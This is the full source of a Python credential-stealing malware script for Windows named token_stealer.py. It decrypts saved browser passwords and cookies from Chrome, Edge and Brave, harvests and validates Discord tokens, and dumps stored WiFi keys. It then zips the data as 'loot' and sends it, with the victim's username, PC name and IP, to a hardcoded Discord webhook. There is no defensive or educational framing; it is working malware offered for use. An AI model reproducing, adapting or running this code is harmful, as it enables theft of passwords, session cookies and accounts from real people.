# token_stealer.py — Windows: browsers + Discord (app & web) + WiFi -> webhook
import os, sys, json, base64, sqlite3, shutil, subprocess, zipfile, tempfile, re, time
import requests
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

WEBHOOK = "https://discord.com/api/webhooks/1558722686958436352/phl6VziL9fyEWxrUiP6djCxsH1gripsdj7nA9lTK2QgAfg1_21GBtc_Rq90UAB4HOkwK"
RUN_ONCE = False

def send_msg(content):
    try:
        requests.post(WEBHOOK, json={"content": content}, timeout=15)
    except Exception:
        pass

def send_file(path, name):
    with open(path, "rb") as f:
        requests.post(WEBHOOK, data={"content": f"**{name}**"},
                      files={"file": (name, f)}, timeout=120)

def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        state = json.load(f)
    enc = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]

def decrypt_value(blob, key):
    if not blob:
        return ""
    try:
        if blob[:3] in (b"v10", b"v11"):
            nonce, payload, tag = blob[3:15], blob[15:-16], blob[-16:]
            return AESGCM(key).decrypt(nonce, payload + tag, None).decode("utf-8", "ignore")
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", "ignore")
    except Exception:
        return ""

def extract_browser(user_data_dir, browser):
    out = {"passwords": [], "cookies": []}
    local_state = os.path.join(user_data_dir, "Local State")
    if not os.path.isfile(local_state):
        return out
    try:
        key = get_master_key(local_state)
    except Exception:
        key = None
    for entry in os.listdir(user_data_dir):
        profile = os.path.join(user_data_dir, entry)
        if not os.path.isdir(profile):
            continue
        if entry != "Default" and not entry.startswith("Profile"):
            continue
        login_db = os.path.join(profile, "Login Data")
        if os.path.isfile(login_db):
            try:
                tmp = os.path.join(tempfile.gettempdir(), f"ld_{browser}_{entry}.db")
                shutil.copy2(login_db, tmp)
                con = sqlite3.connect(tmp)
                for url, uname, pwv in con.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"):
                    out["passwords"].append({"browser": browser, "profile": entry, "url": url,
                                             "user": uname, "pass": decrypt_value(pwv, key) if key else ""})
                con.close()
            except Exception:
                pass
        cookie_db = os.path.join(profile, "Network", "Cookies")
        if os.path.isfile(cookie_db):
            try:
                tmp = os.path.join(tempfile.gettempdir(), f"ck_{browser}_{entry}.db")
                shutil.copy2(cookie_db, tmp)
                con = sqlite3.connect(tmp)
                for host, name, val in con.execute(
                        "SELECT host_key, name, encrypted_value FROM cookies"):
                    out["cookies"].append({"browser": browser, "profile": entry, "host": host,
                                           "name": name, "value": decrypt_value(val, key) if key else ""})
                con.close()
            except Exception:
                pass
    return out

def get_discord_tokens():
    tokens = set()
    appdata = os.getenv("APPDATA", "")
    for sub in ["Discord", "discordptb", "discordcanary"]:
        path = os.path.join(appdata, sub, "Local Storage", "leveldb")
        if not os.path.isdir(path):
            continue
        for f in os.listdir(path):
            if not f.endswith((".ldb", ".log")):
                continue
            data = open(os.path.join(path, f), "rb").read()
            for m in re.findall(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", data):
                try:
                    raw = base64.b64decode(m)
                    if raw[:3] == b"v10":
                        raw = raw[3:]
                    tok = win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1].decode("utf-8", "ignore")
                    if tok:
                        tokens.add(tok)
                except Exception:
                    pass
            for m in re.findall(rb"[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,45}", data):
                tokens.add(m.decode("utf-8", "ignore"))
    local = os.getenv("LOCALAPPDATA", "")
    brows = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge":   os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave":  os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
    }
    for bname, base in brows.items():
        if not os.path.isdir(base):
            continue
        for entry in os.listdir(base):
            prof = os.path.join(base, entry)
            if not os.path.isdir(prof) or (entry != "Default" and not entry.startswith("Profile")):
                continue
            ls = os.path.join(prof, "Local Storage", "leveldb")
            if not os.path.isdir(ls):
                continue
            for f in os.listdir(ls):
                if not f.endswith((".ldb", ".log")):
                    continue
                raw = open(os.path.join(ls, f), "rb").read()
                for off in (0, 1):
                    txt = raw[off:].decode("utf-16-le", "ignore")
                    for m in re.findall(r"[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,45}", txt):
                        tokens.add(m)
    return list(tokens)

def validate(tok):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me",
                         headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"}, timeout=10)
        if r.status_code == 200:
            j = r.json()
            return f"{tok}  ->  {j.get('username')} ({j.get('id')})"
    except Exception:
        pass
    return None

def get_wifi():
    result = {}
    try:
        out = subprocess.run(["netsh", "wlan", "show", "profiles"],
                             capture_output=True, text=True, timeout=20).stdout
        names = [l.split(":", 1)[1].strip() for l in out.splitlines() if "All User Profile" in l]
        for n in names:
            d = subprocess.run(["netsh", "wlan", "show", "profile", f"name={n}", "key=clear"],
                               capture_output=True, text=True, timeout=20).stdout
            for line in d.splitlines():
                if "Key Content" in line:
                    result[n] = line.split(":", 1)[1].strip()
    except Exception:
        pass
    return result

def main():
    base = os.path.join(os.getenv("LOCALAPPDATA", tempfile.gettempdir()), "tmp_stealer")
    os.makedirs(base, exist_ok=True)
    if RUN_ONCE and os.path.isfile(os.path.join(base, "run.log")):
        sys.exit()

    user = os.getenv("USERNAME", "unknown")
    pc = os.getenv("COMPUTERNAME", "unknown")
    try:
        ip = requests.get("https://api.ipify.org", timeout=10).text
    except Exception:
        ip = "unknown"

    local = os.getenv("LOCALAPPDATA", "")
    brows = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge":   os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave":  os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
    }
    data = {"passwords": [], "cookies": []}
    for name, d in brows.items():
        if os.path.isdir(d):
            r = extract_browser(d, name)
            data["passwords"] += r["passwords"]
            data["cookies"] += r["cookies"]

    wifi = get_wifi()
    raw_tokens = get_discord_tokens()
    valid = []
    for t in raw_tokens:
        v = validate(t)
        if v:
            valid.append(v)
        time.sleep(0.25)

    report = os.path.join(base, "report.json")
    with open(report, "w", encoding="utf-8") as f:
        json.dump({"user": user, "pc": pc, "ip": ip, "wifi": wifi,
                   "valid_tokens": valid, "all_tokens": raw_tokens,
                   "passwords": data["passwords"], "cookies": data["cookies"]},
                  f, indent=2)

    zip_path = os.path.join(base, "loot.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(report, "report.json")

    send_msg(f"```\nUser: {user}\nPC: {pc}\nIP: {ip}\n"
             f"Working tokens: {len(valid)}\n"
             f"Passwords: {len(data['passwords'])}\nCookies: {len(data['cookies'])}\n"
             f"WiFi: {len(wifi)}```")
    if valid:
        send_msg("**WORKING TOKENS (token -> username):**\n```\n" + "\n".join(valid) + "\n```")
    try:
        send_file(zip_path, f"{user}_loot.zip")
    except Exception as e:
        send_msg(f"file send failed: {e}")

    with open(os.path.join(base, "run.log"), "w") as f:
        f.write("done")

if __name__ == "__main__":
    main()
